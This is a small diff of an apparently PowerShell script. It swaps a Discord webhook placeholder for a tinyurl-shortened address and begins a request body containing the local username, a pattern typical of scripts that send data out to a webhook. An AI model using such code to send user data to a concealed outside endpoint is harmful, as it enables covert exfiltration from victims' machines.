@@ -8,7 +8,7 @@ param (
     [string]$text 
 )
 
-$hookurl = 'YOUR-DISCORD-WEBHOOK'
+$hookurl = 'https://tinyurl.com/3u67z8wa'
 
 $Body = @{
   'username' = $env:username
